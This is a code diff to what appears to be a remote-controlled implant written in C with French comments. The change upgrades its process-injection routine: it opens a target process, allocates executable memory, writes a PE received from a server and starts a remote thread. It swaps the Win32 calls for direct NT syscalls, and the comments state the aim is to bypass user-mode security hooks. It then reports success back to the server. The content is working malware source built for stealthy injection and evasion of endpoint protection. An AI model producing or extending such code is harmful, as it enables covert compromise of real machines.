@@ -11,6 +11,7 @@
 #ifdef _WIN32
     #include <windows.h>
     #include <tlhelp32.h>
+    #include "syscalls.h"
 #else
     #include <unistd.h>
 #endif
@@ -77,46 +78,101 @@ static void inject_pe(void) {
     DWORD pid = find_process_by_name(target_process_name);
     if (pid == 0) return;
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return;
+    /* Ouvre le processus via syscall direct (bypass hooks) */
+    HANDLE hProcess = NULL;
+    CLIENT_ID client_id = {0};
+    client_id.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+    client_id.UniqueThread = NULL;
 
-    void* base_addr = VirtualAllocEx(hProcess, (LPVOID)0x7FFF0000, pe_size,
-                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    OBJECT_ATTRIBUTES obj_attr = {0};
+    obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
 
-    if (!base_addr) {
-        base_addr = VirtualAllocEx(hProcess, NULL, pe_size,
-                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    NTSTATUS status = syscall_NtOpenProcess(
+        &hProcess,
+        PROCESS_ALL_ACCESS,
+        &obj_attr,
+        &client_id
+    );
+
+    if (!NT_SUCCESS(status) || !hProcess) return;
+
+    /* Alloue de la mémoire via syscall direct */
+    void* base_addr = (void*)0x7FFF0000;
+    SIZE_T region_size = pe_size;
+
+    status = syscall_NtAllocateVirtualMemory(
+        hProcess,
+        &base_addr,
+        0,
+        &region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    /* Si l'allocation à 0x7FFF0000 échoue, essaye NULL */
+    if (!NT_SUCCESS(status)) {
+        base_addr = NULL;
+        region_size = pe_size;
+        status = syscall_NtAllocateVirtualMemory(
+            hProcess,
+            &base_addr,
+            0,
+            &region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
     }
 
-    if (!base_addr) {
-        CloseHandle(hProcess);
+    if (!NT_SUCCESS(status)) {
+        syscall_NtClose(hProcess);
         return;
     }
 
-    SIZE_T written;
-    if (!WriteProcessMemory(hProcess, base_addr, pe_buffer, pe_size, &written)) {
-        VirtualFreeEx(hProcess, base_addr, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    /* Écrit le PE en mémoire via syscall direct */
+    SIZE_T written = 0;
+    status = syscall_NtWriteVirtualMemory(
+        hProcess,
+        base_addr,
+        pe_buffer,
+        pe_size,
+        &written
+    );
+
+    if (!NT_SUCCESS(status)) {
+        syscall_NtClose(hProcess);
         return;
     }
 
+    /* Crée le thread distant via syscall direct */
     void* entry = (void*)((uint8_t*)base_addr + pe_entry_rva);
-    DWORD thread_id;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-                                        (LPTHREAD_START_ROUTINE)entry,
-                                        base_addr, 0, &thread_id);
+    HANDLE hThread = NULL;
 
+    status = syscall_NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        entry,
+        base_addr,
+        0,
+        0,
+        0,
+        0,
+        NULL
+    );
+
+    /* Envoie la confirmation au serveur */
     packet_t pkt;
     pkt_init(&pkt, PKT_PE_COMPLETE);
     payload_pe_complete_t complete;
-    complete.success = (hThread != NULL);
-    complete.thread_id = thread_id;
+    complete.success = NT_SUCCESS(status);
+    complete.thread_id = (uint32_t)(ULONG_PTR)hThread;
     complete.base_address = (uint64_t)(uintptr_t)base_addr;
     pkt_set_payload(&pkt, &complete, sizeof(complete));
     send_packet(&pkt, 1);
 
-    if (hThread) CloseHandle(hThread);
-    CloseHandle(hProcess);
+    if (hThread) syscall_NtClose(hThread);
+    syscall_NtClose(hProcess);
 
     free(pe_buffer);
     pe_buffer = NULL;
@@ -125,6 +181,14 @@ static void inject_pe(void) {
 
 int main(void) {
     if (net_init() != 0) return 1;
+
+#ifdef _WIN32
+    /* Initialise les syscalls directs pour contourner les hooks user-mode */
+    if (syscalls_init() != 0) {
+        net_cleanup();
+        return 1;
+    }
+#endif
 
     client_socket = net_create_socket();
     if (client_socket == INVALID_SOCKET_VALUE) {
@@ -201,6 +265,10 @@ int main(void) {
         net_close_socket(client_socket);
     }
     net_cleanup();
+
+#ifdef _WIN32
+    syscalls_cleanup();
+#endif
 
     if (pe_buffer) free(pe_buffer);
 
